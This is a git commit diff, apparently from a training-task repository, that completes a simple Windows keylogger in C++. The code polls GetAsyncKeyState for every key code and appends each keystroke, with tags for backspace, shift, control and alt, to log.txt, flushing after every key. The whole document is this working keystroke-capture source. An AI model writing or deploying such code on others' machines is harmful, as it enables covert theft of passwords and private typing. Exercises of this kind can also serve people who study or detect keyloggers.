0d33989527cbcabcb8f2a12ddd78312dfdd24d9f
chandrakamalsingh007 <chandrakamalsingh007@gmail.com>
2025-02-08 09:51:49 +0545

    Task 03- Simple Keylogger completed for windows

--- keylogger.cpp
+++ keylogger.cpp
@@ -1,24 +1,24 @@
-#include<iostream>
-#include<windows.h>
-#include<winuser.h>
-#include<fstream>
+#include <iostream>
+#include <windows.h>
+#include <winuser.h>
+#include <fstream>
 using namespace std;
 
 void startLogging();
 
-int main(){
+int main() {
     startLogging();
 }
 
-void startLogging(){
+void startLogging() {
     char c;
-    while(true){
-        for( c = 0; c<=254 ; c++){
-            if(GetAsyncKeyState(c) & 0x1){
-                ofstream log;
-                log.open("log.txt",ios::app);
-                log << c;
-                switch(c){
+    ofstream log("log.txt", ios::app);  // Open the log file once
+
+    while (true) {
+        Sleep(10);  // Reduce CPU usage
+        for (c = 0; c <= 254; c++) {
+            if (GetAsyncKeyState(c) & 0x1) {
+                switch (c) {
                     case VK_BACK:
                         log << "[backspace]";
                         break;
@@ -29,22 +29,24 @@ void startLogging(){
                         log << "[shift]";
                         break;
                     case VK_CONTROL:
-                        log << "[control]"
+                        log << "[control]";
                         break;
                     case VK_CAPITAL:
-                        log << "[cap]";
+                        log << "[caps lock]";
                         break;
                     case VK_TAB:
                         log << "[tab]";
                         break;
                     case VK_MENU:
                         log << "[alt]";
+                        break;
                     case VK_LBUTTON:
                     case VK_RBUTTON:
-                        break;
+                        break;  // Ignore mouse clicks
                     default:
                         log << c;
                 }
+                log.flush();  // Ensure data is written immediately
             }
         }
     }
